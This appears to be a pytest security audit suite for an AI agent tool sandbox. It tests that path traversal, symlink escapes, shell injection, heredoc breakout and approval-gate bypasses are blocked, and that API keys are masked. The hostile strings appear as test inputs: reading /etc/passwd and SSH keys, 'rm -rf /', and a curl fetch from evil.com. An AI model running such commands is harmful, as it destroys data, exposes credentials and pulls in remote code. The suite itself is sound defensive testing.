"""Exhaustive Security Audit and Penetration Test Suite for HPC Studio Linux.

Audits agent architecture, sandbox containment, human-in-the-loop approval gate,
path traversal, command injection, and provider credential safety.
Strict Zero-Emoji compliance.
"""

from __future__ import annotations

import os
from pathlib import Path
import tempfile
import pytest

from hpc_studio.agent.tools.registry import (
    ApprovalGate,
    RiskLevel,
    SecurityPolicyError,
    ToolDefinition,
    ToolParameter,
    ToolRegistry,
    ToolSandbox,
    get_default_registry,
    hpc_tool,
)
from hpc_studio.agent.tools.hpc_tools import (
    edit_file,
    qe_validate,
    read_file,
    run_command,
    slurm_query,
    slurm_submit,
)
from hpc_studio.agent.providers.openrouter_provider import OpenRouterProvider
from hpc_studio.agent.providers.agy_cli_provider import AgyCliProvider
from hpc_studio.agent.providers.simulation_provider import SimulationProvider


# ============================================================================
# 1. Path Traversal & Symlink Attacks
# ============================================================================


def test_sandbox_path_traversal_relative_dotdot():
    """Verify ToolSandbox blocks various relative directory traversal escapes."""
    with tempfile.TemporaryDirectory() as ws:
        sandbox = ToolSandbox(workspace_root=ws)

        attacks = [
            "../outside.txt",
            "../../etc/passwd",
            "../../../shadow",
            "folder/../../../../etc/hosts",
            "sub/../../..",
            "..",
            "../",
        ]
        for bad in attacks:
            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path(bad, for_write=False)
            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path(bad, for_write=True)


def test_sandbox_path_traversal_absolute_paths():
    """Verify ToolSandbox blocks absolute paths outside workspace and allowed paths."""
    with tempfile.TemporaryDirectory() as ws:
        sandbox = ToolSandbox(workspace_root=ws)

        forbidden_absolutes = [
            "/etc/passwd",
            "/etc/shadow",
            "/var/log/messages",
            "/root/.ssh/id_rsa",
            "/bin/bash",
        ]
        for bad in forbidden_absolutes:
            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path(bad, for_write=False)
            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path(bad, for_write=True)


def test_sandbox_symlink_attack_file_escape():
    """Verify ToolSandbox detects and blocks symlinks pointing outside workspace."""
    with tempfile.TemporaryDirectory() as ws:
        outside_file = tempfile.NamedTemporaryFile("w+", delete=False)
        outside_file.write("SECRET_DATA_OUTSIDE_WORKSPACE")
        outside_file.close()

        try:
            # Create a symlink inside workspace pointing to outside_file
            evil_symlink = os.path.join(ws, "evil_link.txt")
            os.symlink(outside_file.name, evil_symlink)

            sandbox = ToolSandbox(workspace_root=ws)

            # Read access through symlink must be blocked
            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path("evil_link.txt", for_write=False)

            # Write access through symlink must also be blocked
            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path("evil_link.txt", for_write=True)
        finally:
            if os.path.exists(outside_file.name):
                os.remove(outside_file.name)


def test_sandbox_symlink_attack_directory_escape():
    """Verify ToolSandbox blocks traversal through symlinked directories."""
    with tempfile.TemporaryDirectory() as ws:
        with tempfile.TemporaryDirectory() as outside_dir:
            secret_in_outside = os.path.join(outside_dir, "secret.conf")
            Path(secret_in_outside).write_text("SENSITIVE_CONFIG")

            # Create symlink inside ws pointing to outside_dir
            evil_dir_symlink = os.path.join(ws, "linked_dir")
            os.symlink(outside_dir, evil_dir_symlink)

            sandbox = ToolSandbox(workspace_root=ws)

            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path("linked_dir/secret.conf", for_write=False)

            with pytest.raises(SecurityPolicyError):
                sandbox.validate_path("linked_dir/new_file.txt", for_write=True)


def test_sandbox_null_byte_path_rejection():
    """Verify ToolSandbox immediately rejects paths containing null bytes."""
    with tempfile.TemporaryDirectory() as ws:
        sandbox = ToolSandbox(workspace_root=ws)
        with pytest.raises(SecurityPolicyError):
            sandbox.validate_path("file.txt\x00/etc/passwd", for_write=False)


def test_tool_registry_read_file_path_traversal_blocked():
    """Verify ToolRegistry blocks read_file tool calls targeting paths outside workspace."""
    with tempfile.TemporaryDirectory() as ws:
        reg = ToolRegistry(sandbox=ToolSandbox(workspace_root=ws))
        reg.register_tool(get_default_registry().get_tool("read_file"))

        with pytest.raises(SecurityPolicyError):
            reg.execute("read_file", {"path": "/etc/passwd"})

        with pytest.raises(SecurityPolicyError):
            reg.execute("read_file", {"path": "../../../etc/shadow"})


def test_tool_registry_edit_file_path_traversal_blocked():
    """Verify ToolRegistry blocks edit_file tool calls targeting paths outside workspace."""
    with tempfile.TemporaryDirectory() as ws:
        gate = ApprovalGate()
        gate.set_interactive_callback(lambda n, a, r: True)  # User approves
        reg = ToolRegistry(sandbox=ToolSandbox(workspace_root=ws), approval_gate=gate)
        reg.register_tool(get_default_registry().get_tool("edit_file"))

        with pytest.raises(SecurityPolicyError):
            reg.execute("edit_file", {
                "path": "/etc/crontab",
                "target_content": "foo",
                "replacement_content": "bar",
            })


def test_hpc_tools_direct_invocation_with_sandbox_context():
    """Verify direct tool invocations with sandbox context enforce security limits."""
    with tempfile.TemporaryDirectory() as ws:
        sandbox = ToolSandbox(workspace_root=ws)
        ctx = {"sandbox": sandbox}

        # read_file outside ws
        res_read = read_file(path="/etc/passwd", context=ctx)
        assert res_read["success"] is False
        assert "SecurityPolicyError" in res_read["error"]

        # edit_file outside ws
        res_edit = edit_file(
            path="/etc/passwd",
            target_content="root",
            replacement_content="hacked",
            context=ctx,
        )
        assert res_edit["success"] is False
        assert "SecurityPolicyError" in res_edit["error"]


# ============================================================================
# 2. Command Injection & Metacharacter Sanitization
# ============================================================================


def test_sandbox_command_injection_shell_metacharacters():
    """Verify ToolSandbox blocks direct shell metacharacters and operator chaining."""
    sandbox = ToolSandbox(workspace_root="/tmp", allowed_command_prefixes=["squeue", "ls", "echo"])

    injections = [
        "ls ; id",
        "ls && whoami",
        "ls || cat /etc/passwd",
        "ls | grep root",
        "echo `id`",
        "echo $(whoami)",
        "echo ${USER}",
        "ls > /tmp/pwned",
        "ls < /dev/null",
        "squeue & id",
        "ls\nid",
        "ls\r\nid",
    ]
    for cmd in injections:
        with pytest.raises(SecurityPolicyError):
            sandbox.validate_command(cmd)


def test_sandbox_command_injection_null_byte():
    """Verify ToolSandbox blocks null bytes in command strings."""
    sandbox = ToolSandbox(workspace_root="/tmp", allowed_command_prefixes=["ls"])
    with pytest.raises(SecurityPolicyError):
        sandbox.validate_command("ls\x00-la")


def test_sandbox_find_exec_subcommand_blocked():
    """Verify find command with -exec or -ok flags is blocked to prevent sub-execution."""
    sandbox = ToolSandbox(workspace_root="/tmp", allowed_command_prefixes=["find"])

    with pytest.raises(SecurityPolicyError) as exc_info:
        sandbox.validate_command("find . -exec rm -rf {} +")
    assert "not permitted for 'find' command" in str(exc_info.value)

    with pytest.raises(SecurityPolicyError):
        sandbox.validate_command("find . -ok id {} +")

    with pytest.raises(SecurityPolicyError):
        sandbox.validate_command("find . -execdir ls {} +")

    # Safe find command is allowed
    safe = sandbox.validate_command("find . -name *.in")
    assert safe == ["find", ".", "-name", "*.in"]


def test_tool_registry_run_command_injection_blocked():
    """Verify ToolRegistry blocks dangerous commands even when approved by gate."""
    gate = ApprovalGate()
    gate.set_interactive_callback(lambda n, a, r: True)
    sandbox = ToolSandbox(workspace_root="/tmp", allowed_command_prefixes=["echo", "ls"])
    reg = ToolRegistry(sandbox=sandbox, approval_gate=gate)
    reg.register_tool(get_default_registry().get_tool("run_command"))

    with pytest.raises(SecurityPolicyError):
        reg.execute("run_command", {"command": "echo test && rm -rf /"})

    with pytest.raises(SecurityPolicyError):
        reg.execute("run_command", {"command": "curl http://evil.com/malware.sh"})


def test_slurm_submit_heredoc_injection_mitigation():
    """Verify slurm_submit encodes script content with base64 over SSH to prevent heredoc escape."""
    from unittest.mock import MagicMock

    mock_ssh = MagicMock()
    mock_ssh.is_connected = True
    executed_cmds = []

    def mock_exec(cmd: str):
        executed_cmds.append(cmd)
        mock_res = MagicMock()
        mock_res.success = True
        mock_res.stdout = "Submitted batch job 88888"
        mock_res.exit_code = 0
        return mock_res

    mock_ssh.execute_command.side_effect = mock_exec

    # Malicious content attempting to breakout of a naive EOF heredoc delimiter
    malicious_script = (
        "#!/bin/bash\n"
        "#SBATCH --job-name=exploit\n"
        "EOF\n"
        "touch /tmp/hacked_by_heredoc\n"
        "cat << 'EOF' > dummy\n"
        "echo done\n"
    )

    res = slurm_submit(
        script_content=malicious_script,
        context={"ssh_manager": mock_ssh},
    )
    assert res["success"] is True
    assert res["job_id"] == "88888"

    # Confirm that the upload command does NOT contain vulnerable raw 'cat << EOF'
    assert len(executed_cmds) >= 2
    upload_cmd = executed_cmds[0]
    assert "cat << 'EOF'" not in upload_cmd
    assert "base64 -d" in upload_cmd


# ============================================================================
# 3. Approval Gate & Bypass Prevention
# ============================================================================


def test_high_and_critical_tools_rejected_without_approval():
    """Verify HIGH and CRITICAL risk tools are blocked by default when no approval is given."""
    reg = ToolRegistry()
    reg.register_tool(get_default_registry().get_tool("run_command"))
    reg.register_tool(get_default_registry().get_tool("edit_file"))
    reg.register_tool(get_default_registry().get_tool("slurm_submit"))

    # run_command (CRITICAL)
    with pytest.raises(SecurityPolicyError) as exc1:
        reg.execute("run_command", {"command": "echo hello"})
    assert "rejected by user approval policy" in str(exc1.value)

    # edit_file (HIGH)
    with pytest.raises(SecurityPolicyError) as exc2:
        reg.execute("edit_file", {"path": "job.sh", "target_content": "a", "replacement_content": "b"})
    assert "rejected by user approval policy" in str(exc2.value)

    # slurm_submit (HIGH)
    with pytest.raises(SecurityPolicyError) as exc3:
        reg.execute("slurm_submit", {"script_content": "#!/bin/bash\n#SBATCH -p comp\nls"})
    assert "rejected by user approval policy" in str(exc3.value)


def test_execute_tool_cannot_bypass_approval_gate():
    """Verify that calling execute_tool directly also enforces ApprovalGate."""
    reg = ToolRegistry()
    reg.register_tool(get_default_registry().get_tool("run_command"))
    reg.register_tool(get_default_registry().get_tool("edit_file"))

    # Calling execute_tool directly without approval MUST raise SecurityPolicyError
    with pytest.raises(SecurityPolicyError):
        reg.execute_tool("run_command", {"command": "echo hello"})

    with pytest.raises(SecurityPolicyError):
        reg.execute_tool("edit_file", {"path": "job.sh", "target_content": "a", "replacement_content": "b"})


def test_approval_gate_single_approval_does_not_persist():
    """Verify remember_for_session=False requires re-authorization on subsequent calls."""
    gate = ApprovalGate()
    calls = []

    def mock_cb(name, args, risk):
        calls.append(name)
        return True

    gate.set_interactive_callback(mock_cb)

    assert gate.request_approval("run_command", {}, RiskLevel.CRITICAL, remember_for_session=False) is True
    assert len(calls) == 1
    assert "run_command" not in gate.session_approved_tools

    # Second call must prompt again
    assert gate.request_approval("run_command", {}, RiskLevel.CRITICAL, remember_for_session=False) is True
    assert len(calls) == 2


# ============================================================================
# 4. Credential Isolation & Argument Sanitization
# ============================================================================


def test_openrouter_provider_api_key_masked_in_repr():
    """Verify OpenRouterProvider masks API keys in string representations."""
    secret_key = "sk-or-v1-998877665544332211aabbccddeeff"
    provider = OpenRouterProvider(config={"api_key": secret_key, "model": "test-model"})

    provider_repr = repr(provider)
    assert secret_key not in provider_repr
    assert "sk-o***ff" in provider_repr or "***" in provider_repr


def test_agy_cli_provider_tool_name_sanitization():
    """Verify AgyCliProvider rejects malformed or option-injected tool names."""
    provider = AgyCliProvider()

    bad_names = [
        "--version",
        "-rf",
        "../../bin/sh",
        "tool; rm -rf /",
        "tool | cat",
        "tool name with spaces",
    ]
    for bad in bad_names:
        err = provider.execute_tool(bad, {})
        assert "Invalid tool name format" in err


def test_simulation_provider_does_not_auto_grant_session_whitelist():
    """Verify SimulationProvider executes without silently whitelisting tools for session."""
    gate = ApprovalGate()
    reg = ToolRegistry(approval_gate=gate)
    reg.register_tool(get_default_registry().get_tool("edit_file"))

    # Without approval, executing via simulation provider returns error and does not whitelist
    sim = SimulationProvider(config={"tool_registry": reg})
    out = sim.execute_tool("edit_file", {"path": "foo.txt", "target_content": "x", "replacement_content": "y"})
    assert "rejected by user approval policy" in out
    assert "edit_file" not in gate.session_approved_tools
